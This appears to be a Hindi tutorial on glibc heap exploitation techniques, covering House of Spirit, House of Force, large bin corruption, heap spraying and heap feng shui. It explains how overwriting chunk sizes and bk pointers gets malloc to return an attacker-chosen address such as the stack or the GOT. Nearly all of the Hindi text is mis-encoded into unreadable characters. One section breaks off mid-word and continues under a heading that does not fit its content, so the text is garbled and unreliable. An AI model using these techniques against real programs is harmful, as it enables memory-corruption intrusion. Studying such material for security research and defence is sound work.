**The House of Spirit**

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╣рдореЗрдВ рдПрдХ malloc рдХреЗ рдкреЙрдЗрдВрдЯрд░ рдХреЛ рдЕрд▓реНрдЯрд░ рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ рдЬреЛ рд╣рдорд▓реЗ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рджреНрд╡рд╛рд░рд╛ рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХреЗ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рдУрд╡рд░рдлрд╝реНрд▓реЛ рдХреЗ рдиреАрдЪреЗ рд╕реНрдЯреИрдХ рдкрд░ рдкреЙрдЗрдВрдЯрд░ рд╣реЛ)ред

рдЗрд╕ рддрд░рд╣, рд╣рдо рдЗрд╕ рдкреЙрдЗрдВрдЯрд░ рдХреЛ рдХрд╣реАрдВ рднреА рдирд┐рд╢рд╛рдирд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╣рд░ рдЬрдЧрд╣ рд╡реИрдз рдирд╣реАрдВ рд╣реИ, рдЭреВрдареЗ рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдЖрдХрд╛рд░ av->max\_fast рд╕реЗ рдХрдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдПрдХ рднрд╡рд┐рд╖реНрдп рдХреЗ malloc() рдХреЙрд▓ рдореЗрдВ рдорд╛рдВрдЧреЗ рдЧрдП рдЖрдХрд╛рд░ рдХреЗ рдмрд░рд╛рдмрд░ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рд╣рдо рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рдЗрд╕ рдкреЙрдЗрдВрдЯрд░ рдХреЗ рдиреАрдЪреЗ malloc(40) рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рддреЛ рдЭреВрдареЗ рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдЖрдХрд╛рд░ 48 рдХреЗ рдмрд░рд╛рдмрд░ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдПрдХ рд╕рдВрдЦреНрдпрд╛ рдкреВрдЫрддрд╛ рд╣реИ, рддреЛ рд╣рдо 48 рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ malloc рдХреЗ рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЗ рдЕрдЧрд▓реЗ 4 рдмрд╛рдЗрдЯреЛрдВ рдХреЛ рдирд┐рд╢рд╛рдирд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЬреЛ EBP рдХреЗ рд╣рд┐рд╕реНрд╕реЗ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕ рддрд░рд╣ 48 рдкреАрдЫреЗ рд░рд╣ рдЬрд╛рддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдпрд╣ рдЖрдХрд╛рд░ рд╣реИ)ред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, ptr-4+48 рдкрддрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рд╢рд░реНрддреЛрдВ рдХреЛ рдкреВрд░рд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ ptr=EBP рд╣реИ), рдЕрд░реНрдерд╛рдд, 8 < ptr-4+48 < av->system\_memред

рдпрджрд┐ рдпрд╣ рдкреВрд░рд╛ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЬрдм рдЕрдЧрд▓реА malloc() рдХреЛ рдХрд╣рд╛ рдЬрд╛рдПрдЧрд╛ рдЬрд┐рд╕реЗ рд╣рдордиреЗ рдХрд╣рд╛ рдХрд┐ рдпрд╣ malloc(40) рд╣реИ, рддреЛ рдЙрд╕реЗ EBP рдХрд╛ рдкрддрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдпрджрд┐ рд╣рдорд▓реЗ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рднреА рдЗрд╕ malloc рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХрд╛ рдирд┐рдпрдВрддреНрд░рдг рд░рдЦ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ EBP рдФрд░ EIP рджреЛрдиреЛрдВ рдХреЛ рдЙрд╕ рдкрддреЗ рдкрд░ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕ рддрд░рд╣, рдЬрдм рдЙрд╕реЗ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ free() рддреЛ рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░реЗрдЧрд╛ рдХрд┐ рд╕реНрдЯреИрдХ рдХреЗ EBP рдХреЛ рдирд┐рд╢рд╛рдирд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдкрддреЗ рдкрд░ рдПрдХ рдЯреБрдХрдбрд╝рд╛ рд╣реИ рдЬреЛ рдирдП malloc() рдХреЗ рд▓рд┐рдП рд╕рд╣реА рдЖрдХрд╛рд░ рдХрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╡рд╣ рдЙрд╕ рдкрддреЗ рдХреЛ рдирд┐рд╢рд╛рдирд┐рдд рдХрд░реЗрдЧрд╛ред

**The House of Force**

рдЖрд╡рд╢реНрдпрдХ рд╣реИ:

* рдПрдХ рдЯреБрдХрдбрд╝реЗ рдХреЛ рдУрд╡рд░рдлрд╝реНрд▓реЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдУрд╡рд░рдлрд╝реНрд▓реЛ
* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдЖрдХрд╛рд░ рдХреЗ рд╕рд╛рде malloc() рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛
* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдбреЗрдЯрд╛ рдХреЗ рд╕рд╛рде malloc() рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛

рдкрд╣рд▓реА рдЪреАрдЬ рдЬреЛ рдХреА рдЬрд╛рддреА рд╣реИ, рд╡рд┐рд▓реНрдбрд░реНрдиреЗрд╕ рдХреЗ рдЯреБрдХрдб
рдпрджрд┐ рдмрд┐рди рдореЗрдВ рдПрдХ рдЯреБрдХрдбрд╝рд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЖрдХрд╛рд░ рдорд╛рдВрдЧреЗ рдЧрдП рдЖрдХрд╛рд░ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рд╣реИ, рддреЛ рдЙрд╕реЗ рдЙрд╕рдХреЗ рдмрд╛рдж рдЕрдирд▓реЙрдХ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рд╡рд╛рдкрд╕ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:

bck = victim->bk; рдкрд┐рдЫрд▓реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реИ, рдпрд╣ рд╣рдореЗрдВ рдмрджрд▓ рд╕рдХрдиреЗ рдХреА рдПрдХрдорд╛рддреНрд░ рдЬрд╛рдирдХрд╛рд░реА рд╣реИред

bin->bk = bck; рджреВрд╕рд░реЗ рдЯреБрдХрдбрд╝реЗ рдХреЛ рдЕрдВрддрд┐рдо рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рдпрджрд┐ bck рд╕реНрдЯреИрдХ рдХреЛ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЕрдЧрд▓реЗ рдЖрд░рдХреНрд╖рд┐рдд рдЯреБрдХрдбрд╝реЗ рдХреЛ рдЗрд╕ рдкрддреЗ рдкрд░ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛

bck->fd = bin; рдЗрд╕реЗ рдмрдВрдж рдХрд░рдХреЗ рд╕реВрдЪреА рдХреЛ рдмрд┐рди рдХрд░рдирд╛, рдЬрд┐рд╕реЗ рдпрд╣ bin рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░реЗрдЧрд╛

рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:

рджреЛ malloc рдЖрд░рдХреНрд╖рд┐рдд рдХрд┐рдП рдЬрд╛рдиреЗ рдЪрд╛рд╣рд┐рдП, рддрд╛рдХрд┐ рдкрд╣рд▓реЗ рдкрд░ overflow рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдЬрдм рджреВрд╕рд░рд╛ рдЙрд╕рдХреЗ bin рдореЗрдВ рдбрд╛рд▓ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ (рдЕрд░реНрдерд╛рдд, overflow рдХрд┐рдП рдЬрд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рджреВрд╕рд░реЗ рдЯреБрдХрдбрд╝реЗ рд╕реЗ рдЕрдзрд┐рдХ malloc рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ)

рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдЪрдпрдирд┐рдд рдкрддреЗ рд╡рд╛рд▓реЗ malloc рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

рд▓рдХреНрд╖реНрдп рдпрд╣ рд╣реИ, рдпрджрд┐ рд╣рдо рдПрдХ рд╣реАрдк рдкрд░ рдПрдХ рд╣реАрдк рдХреЛ рдУрд╡рд░рдлреНрд▓реЛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХреЗ рдиреАрдЪреЗ рдПрдХ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЙрдкрдпреБрдХреНрдд рдЯреБрдХрдбрд╝рд╛ рд╣реИ рдФрд░ рдЙрд╕рдХреЗ bin рдореЗрдВ рд╣реИ, рддреЛ рд╣рдо рдЙрд╕рдХрд╛ рдкреЙрдЗрдВрдЯрд░ bk рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рд╣рдо рдЙрд╕рдХрд╛ рдкреЙрдЗрдВрдЯрд░ bk рдмрджрд▓ рджреЗрддреЗ рд╣реИрдВ рдФрд░ рдпрд╣ рдЯреБрдХрдбрд╝рд╛ рдмрд┐рди рдХреА рд╕реВрдЪреА рдХрд╛ рдкрд╣рд▓рд╛ рдЯреБрдХрдбрд╝рд╛ рдмрди рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЙрд╕реЗ рдЖрд░рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдмрд┐рди рдХреЛ рдзреЛрдЦрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдЙрд╕реЗ рдмрддрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдХрд┐ рд╕реВрдЪреА рдХрд╛ рдЕрдВрддрд┐рдо рдЯреБрдХрдбрд╝рд╛ (рдЕрдЧрд▓рд╛ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд) рдЙрд╕ рдЧрд▓рдд рдкрддреЗ рдкрд░ рд╣реИ рдЬрд┐рд╕реЗ рд╣рдордиреЗ рдбрд╛рд▓рд╛ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рд╕реНрдЯреИрдХ рдпрд╛ GOT)ред рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдПрдХ рдФрд░ рдЯреБрдХрдбрд╝рд╛ рдЖрд░рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ рдЗрд╕рдореЗрдВ рдЕрдиреБрдорддрд┐ рд╣реИ, рддреЛ рдЙрд╕реЗ рд╡рд╛рдВрдЫрд┐рдд рд╕реНрдерд╛рди рдкрд░ рдПрдХ рдЯреБрдХрдбрд╝рд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдЙрд╕рдореЗрдВ рд▓рд┐рдЦрд╛ рдЬрд╛ рд╕рдХреЗрдЧрд╛ред

рд╕рдВрд╢реЛрдзрд┐рдд рдЯреБрдХрдбрд╝рд╛ рдореБрдХреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдЙрд╕реЗ рдореБрдХреНрдд рдХрд┐рдП рдЧрдП рдЯреБрдХрдбрд╝реЗ рд╕реЗ рдЕрдзрд┐рдХ рдПрдХ рдЯреБрдХрдбрд╝рд╛ рдЖрд░рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╕рдВрд╢реЛрдзрд┐рдд рдЯреБрдХрдбрд╝рд╛ рдЕрдирд╕реЙрд░реНрдЯреЗрдб рдмрд┐рди рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдЙрд╕рдХреЗ рдмрд┐рди рдореЗрдВ рдбрд╛рд▓рд╛ рдЬрд╛рдПрдЧрд╛ред

рдПрдХ рдмрд╛рд░ рдЙрд╕рдХреЗ рдмрд┐рди рдореЗрдВ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж, рдЙрд╕рдХреЗ рдкреЙрдЗрдВрдЯрд░ bk рдХреЛ рдУрд╡рд░рдлреНрд▓реЛ рдХрд░рдХреЗ рдЙрд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХрд╛ рд╕рдордп рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ рд╣рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрд╕ рдкрддреЗ рдкрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░реЗред

рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдмрд┐рди рдХреЛ рдЙрдореНрдореАрдж рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ malloc() рдХреЛ рдкреБрдХрд╛рд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рд╕рдордп рддрдХ рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░рдиреА рдкрдбрд╝реЗрдЧреА рддрд╛рдХрд┐ рд╕рдВрд╢реЛрдзрд┐рдд рдмрд┐рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдлрд┐рд░ рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рдП рдФрд░ рдмрд┐рди рдХреЛ рдзреЛрдЦрд╛ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрд╕реЗ рдпрдХреАрди рджрд┐рд▓рд╛рдпрд╛ рдЬрд╛рдП рдХрд┐ рдЕрдЧрд▓рд╛ рдЯреБрдХрдбрд╝рд╛ рдЧрд▓рдд рдкрддреЗ рдкрд░ рд╣реИред рдФрд░ рдЙрд╕рдХреЗ рдмрд╛рдж рд╣рдореЗрдВ рдЪрд╛рд╣рд┐рдП рд╡рд╣ рдЯреБрдХрдбрд╝рд╛ред

рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдЬрд▓реНрдж рд╕реЗ рдЬрд▓реНрдж рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рд╣реЛрдЧрд╛: рд╡рдВрд╢реАрдп рдЯреБрдХрдбрд╝рд╛ рдЖрд░рдХреНрд╖рд┐рдд рдХрд░рдирд╛, рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдЯреБрдХрдбрд╝рд╛ рдЖрд░рдХреНрд╖рд┐рдд рдХрд░рдирд╛, рдпрд╣ рдЯреБрдХрдбрд╝рд╛ рдореБрдХреНрдд рдХрд░рдирд╛, рдЙрд╕рд╕реЗ рдЕрдзрд┐рдХ рдПрдХ рдЯреБрдХрдбрд╝рд╛ рдЖрд░рдХреНрд╖рд┐рдд рдХрд░рдирд╛, рдЯреБрдХрдбрд╝рд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ (рдХрдордЬреЛрд░реА), рд╡рдВрд╢реАрдп рдЯреБрдХрдбрд╝рд╛ рдЖрд░рдХреНрд╖рд┐рдд рдХрд░рдирд╛, рдФрд░ рдПрдХ рджреВрд╕рд░рд╛ рдЯреБрдХрдбрд╝рд╛ рдЖрд░рдХреНрд╖рд┐рдд рдХрд░рдирд╛ рдЬрд┐рд╕рдХрд╛ рдЖрдХрд╛рд░ рд╡рдВрд╢реАрдп рдЯреБрдХрдбрд╝реЗ рдХреЗ рдмрд░рд╛рдмрд░ рд╣реЛ рдФрд░ рдпрд╣ рд╡рд╣ рд╣реЛрдЧрд╛ рдЬреЛ рдЪрдпрдирд┐рдд рдкрддреЗ рдкрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░реЗрдЧрд╛ред

рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдЬрд╛рдВрдЪ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдЯреБрдХрдбрд╝рд╛ "рдЧрд▓рдд" рдирд╣реАрдВ рд╣реИ: рдпрд╣ рдЬрд╛рдВрдЪрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ bck->fd victim рдХреЛ рдЗрд╢рд╛рд░рд╛ рдХрд░ рд░рд╣рд╛ рд╣реИред рдЕрд░реНрдерд╛рдд, рд╣рдорд╛рд░реЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдпрджрд┐ рд╕реНрдЯреИрдХ рдореЗрдВ рдЗрд╢рд╛рд░рд╛ рдХрд┐рдП рдЧрдП рдЧрд▓рдд рдЯреБрдХрдбрд╝реЗ рдХрд╛ fd\* рдкреАрдбрд╝рд┐рдд рдХреЛ рдЗрд╢рд╛рд░рд╛ рдХрд░ рд░рд╣рд╛ рд╣реИред рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЫрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ рд▓рд┐рдЦрдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП (рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╕реНрдЯреИрдХ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ) рдЙрдЪрд┐рдд рдкрддреЗ рдкрд░ victim рдХрд╛ рдкрддрд╛ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдПред рддрд╛рдХрд┐ рдРрд╕рд╛ рд▓рдЧреЗ рдХрд┐ рдПрдХ рд╕рд╣реА рдЯреБрдХрдбрд╝рд╛ рд╣реИред

**рдмрдбрд╝реЗ рдмрд┐рди рдХреЛрд░рдкреНрд╢рди**

рдкрд╣рд▓реЗ рдХреА рддрд░рд╣ рдпрд╣рд╛рдБ рднреА рдПрдХ рдмрд╛рд░ рдмрд┐рди рдХрд╛ рдкреЙрдЗрдВрдЯрд░ bk рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рдФрд░ рд╕рднреА рд╡рд╣реА рдХреЙрд▓реНрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдЖрд░рдХреНрд╖рд┐рдд рдЯреБрдХрдбрд╝реЗ 512 рд╕реЗ рдЕрдзрд┐рдХ рд╣реЛрдиреЗ рдЪрд╛рд╣рд┐рдПред

рд╣рдорд▓рд╛ рдкрд┐рдЫрд▓реЗ рдЬреИрд╕рд╛ рд╣реИ, рдЕрд░реНрдерд╛рдд, рдкреЙрдЗрдВрдЯрд░ bk рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдФрд░ рд╕рднреА рд╡рд╣реА рдХреЙрд▓реНрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рд╕рдВрд╢реЛрдзрд┐рдд рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдЖрдХрд╛рд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рд╡рд╣ size - nb < MINSIZE рд╣реЛред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, 1552 рдХрд╛ рдЖрдХрд╛рд░ рд░рдЦрдирд╛ рд╣реЛрдЧрд╛ рддрд╛рдХрд┐ 1552 - 1544 = 8 < MINSIZE рд╣реЛ (рдпрд╣рд╛рдБ рдПрдХ рдЕрд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдЕрд╡реИрдз рдХрд╛ рддреБрд▓рдирд╛рддреНрдордХ рд╣реЛрддрд╛ рд╣реИ)

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдЗрд╕реЗ рдФрд░ рдЕрдзрд┐рдХ рдХрдард┐рди рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреИрдЪ рднреА рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

**рд╣реАрдк рд╕реНрдкреНрд░реЗрдЗрдВрдЧ**

рдореВрд▓ рд░реВрдк рд╕реЗ рд╣реАрдк рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╛рд╡рдиреА рд╕рднреА рд╕реНрдореГрддрд┐ рдХреЛ рдЖрд░рдХреНрд╖рд┐рдд рдХрд░рдиреЗ рдФрд░ рдЗрдиреНрд╣реЗрдВ рдПрдХ рдиреЙрдкреНрд╕ рдХреЗ рдПрдХ рддрдХрд┐рдпреЗ рд╕реЗ рднрд░рдиреЗ рдХрд╛ рдХрд╛рдо рд╣реИред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдПрдХ рддрдХрд┐рдпреЗ рдХреЗ рд░реВрдк рдореЗрдВ 0x0c рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рдХреЛрд╢рд┐рд╢ рдХреА рдЬрд╛рдПрдЧреА рдХрд┐ 0x0c0c0c0c рдкрддреЗ рдкрд░ рдЙрдЫрд╛рд▓рд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛рдП, рдФрд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдпрджрд┐ рдХрд┐рд╕реА рдкрддреЗ рдХреЛ рдЗрд╕ рддрдХрд┐рдпреЗ рд╕реЗ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЗрд╕рдХреЗ рд╕рд╛рде рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛, рддреЛ рд╡рд╣рд╛рдВ рдЙрдЫрд╛рд▓ рд▓рдЧрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдореВрд▓ рд░реВрдк рд╕реЗ рдпрд╣ рдпреЛрдЬрдирд╛ рд╣реИ рдХрд┐ рдХрд┐рддрдирд╛ рд╕рдВрднрд╛рд╡рдиреА рд╣реИ рдХрд┐ рдХреЛрдИ рдкреЙрдЗрдВрдЯрд░ рдУрд╡рд░рд░рд╛рдЗрдЯ рд╣реЛ рдФрд░ 0x0c0c0c0c рдкрд░ рдЙрдЫрд╛рд▓ рд▓рдЧрд╛рдпрд╛ рдЬрд╛рдП рдЬрд┐рд╕рд╕реЗ рдЙрдореНрдореАрдж рд╣реИ рдХрд┐ рд╡рд╣рд╛рдВ рдиреЙрдкреНрд╕ рд╣реЛрдВрдЧреЗред

**рд╣реАрдк рдлреЗрдВрдЧ рд╢реБрдИ**

рдпрд╣ рдЙрд╕реЗ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ рдХрд┐ рд░рд┐рдЬрд░реНрд╡реЗрд╢рди рдФрд░ рд░рд┐рд▓реАрдЬреЗрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдореЗрдореЛрд░реА рдХреЛ рдмреЛрдирд╛ рдЬрд╛рдП рддрд╛рдХрд┐ рдЦрд╛рд▓реА рдЯреБрдХрдбрд╝реЗ рдХреЗ рдмреАрдЪ рдЖрд░рдХреНрд╖рд┐рдд рдЯреБрдХрдбрд╝реЗ рдмрдЪреЗ рд░рд╣реЗрдВред рдУрд╡рд░рдлреНрд▓реЛ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдмрдлрд░ рдЙрдирдореЗрдВ рд╕реЗ рдПрдХ рдореЗрдВ рд╕реНрдерд┐рдд рд╣реЛрдЧрд╛ред
